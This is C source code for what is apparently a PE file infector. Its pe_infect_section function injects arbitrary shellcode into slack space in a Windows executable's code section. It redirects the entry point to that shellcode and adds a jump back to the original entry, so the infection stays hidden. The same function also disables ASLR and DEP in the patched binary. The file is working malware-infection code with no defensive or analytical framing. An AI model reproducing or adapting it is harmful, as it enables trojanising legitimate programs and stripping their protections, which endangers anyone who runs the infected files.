#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "PEinfector.h"
#include "PE.h"




void pe_print_section_header(pe_section_header* header) {
	fprintf(stdout, "Section name: %s\n", header->name);
	fprintf(stdout, "Section VirtualSize: 0x%08X\n", header->Misc.VirtualSize);
	fprintf(stdout, "Section VirtualAddress: 0x%08X\n", header->VirtualAddress);
	fprintf(stdout, "Section SizeOfRawData: %u\n", header->SizeOfRawData);
	fprintf(stdout, "Section PointerToRawData: 0x%08X\n", header->PointerToRawData);
	fprintf(stdout, "Section PointerToRelocations: 0x%08X\n", header->PointerToRelocations);
	fprintf(stdout, "Section PointerToLinenumbers: 0x%08X\n", header->PointerToLinenumbers);
	fprintf(stdout, "Section NumberOfRelocations: %u\n", header->NumberOfRelocations);
	fprintf(stdout, "Section NumberOfLinenumbers: %u\n", header->NumberOfLinenumbers);
	fprintf(stdout, "Section Characteristics: 0x%08X\n", header->Characteristics);
}

int pe_infect_section(FILE* f, FILE* out_f, pe_dos_header* dos_header, pe_nt_header* nt_header, unsigned char* xcode, uint32_t xcode_size) {
	if (!f || !out_f || !dos_header || !nt_header || !xcode || *xcode == '\0') {
		return -1;
	}
	
	if (nt_header->nt_optional_header.image_base < 0x400000 || 
	    nt_header->nt_optional_header.image_base > 0x1000000) {
			return -2;
	}
	
	//search first code section
	uint16_t sections_table_offset = dos_header->e_lfanew + nt_header->nt_file_header.size_of_optional_header + sizeof(pe_file_header) + sizeof(uint32_t);
	rewind(f);
	
	fseek(f, sections_table_offset, SEEK_SET);
	
	pe_section_header codeSectionHeader;
	
	memset(&codeSectionHeader, 0, sizeof(pe_section_header));
	
	for (uint16_t i = 0; i < nt_header->nt_file_header.number_of_sections; i++) {
		pe_section_header sectionHeader;
		
		fread(&sectionHeader, sizeof(pe_section_header), 1, f);

		if (sectionHeader.Characteristics & SECTION_CHARACTER_EXECUTABLE) {
			//that section is executable
			memcpy(&codeSectionHeader, &sectionHeader, sizeof(pe_section_header));
			break;
		}
	}
	
	uint32_t injection_xcode_offset = 0;
	
	fseek(f, codeSectionHeader.PointerToRawData, SEEK_SET);
	
	//getting sections contain
	char* section_contain = (char*)malloc(codeSectionHeader.SizeOfRawData);
		
	if (!section_contain) {
		//internal error. Can't alloc memory for store section
		return -4;
	}
		
	fread(section_contain, codeSectionHeader.SizeOfRawData, 1, f);
	
	//handle case when raw section size more than virtual section size
	if (codeSectionHeader.SizeOfRawData > codeSectionHeader.Misc.VirtualSize) {
		uint32_t delta = codeSectionHeader.SizeOfRawData - codeSectionHeader.Misc.VirtualSize;
		
		//checking delta
		if (delta >= nt_header->nt_optional_header.file_alignment) {
			//bad delta
			free(section_contain);
			return -3;
		}
		
		//checking zeroes
		for (uint16_t i = 0; i < delta; i++) {
			if (section_contain[codeSectionHeader.Misc.VirtualSize + i] != '\0') {
				free(section_contain);
				return -5;
			}
		}
		
		injection_xcode_offset = codeSectionHeader.Misc.VirtualSize;// + sizeof(uint32_t);
	} else { //search inject offset
		uint32_t value = 0;
		
		for (uint32_t i = 0; i < codeSectionHeader.SizeOfRawData / sizeof(value); i++) {
			//fread(&value, sizeof(value), 1, f);
			memcpy(&value, section_contain + i * sizeof(value), sizeof(value));
			
			if (value == 0) {
				//inject offset found
				injection_xcode_offset = (i - 1) * sizeof(value) + 1;
				break;
			}
		}
	}
	
	injection_xcode_offset += 0x16;
	
	uint32_t original_entry_point = nt_header->nt_optional_header.address_of_entry_point + nt_header->nt_optional_header.image_base;
	char mov_eax_bytecode[] = "\xb8";
	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF };
	char jmp_eax_nop_bytecode[] = "\xff\xe0\x90";
	
	if (codeSectionHeader.SizeOfRawData - injection_xcode_offset - 8 < xcode_size) {
		//not enough space for xcode
		free(section_contain);
		return -6;
	}
	
	//new entry point
	nt_header->nt_optional_header.address_of_entry_point = codeSectionHeader.VirtualAddress + injection_xcode_offset;
	
	fprintf(stdout, "original entry point 0x%08X\n", original_entry_point);
	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
	
	//disable ASLR for all
	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_CAN_MOVE;
	nt_header->nt_file_header.characteristics = nt_header->nt_file_header.characteristics | IMAGE_RELOCS_STRIPPED;
	nt_header->nt_optional_header.data_directories.relocation_directory_rva = 0;
	nt_header->nt_optional_header.data_directories.relocation_directory_size = 0;
	
	//disable DEP
	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_NX_COMPAT;
	
	fprintf(stdout, "dll_characteristics 0x%04X\n", nt_header->nt_optional_header.dll_characteristics);
	
	//write to file
	rewind(f);
	fseek(f, 0, SEEK_END);
	uint32_t size = ftell(f);
	rewind(f);
	
	unsigned char* file_buf = (unsigned char*)malloc(size);
	
	if (!file_buf) {
		free(section_contain);
		return -7;
	}
	
	fread(file_buf, size, 1, f);
	fwrite(file_buf, size, 1, out_f);
	
	free(file_buf);
	
	//write new info
	fseek(out_f, dos_header->e_lfanew, SEEK_SET);
	fwrite(nt_header, sizeof(pe_nt_header), 1, out_f);
	
	//xcode injection
	memcpy(section_contain + injection_xcode_offset, xcode, xcode_size);
	memcpy(section_contain + injection_xcode_offset + xcode_size, mov_eax_bytecode, sizeof(mov_eax_bytecode));
	memcpy(section_contain + injection_xcode_offset + xcode_size - 1 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
	memcpy(section_contain + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
	
	fseek(out_f, codeSectionHeader.PointerToRawData, SEEK_SET);
	fwrite(section_contain, codeSectionHeader.SizeOfRawData, 1, out_f);
	
	free(section_contain);
	return 0;
}
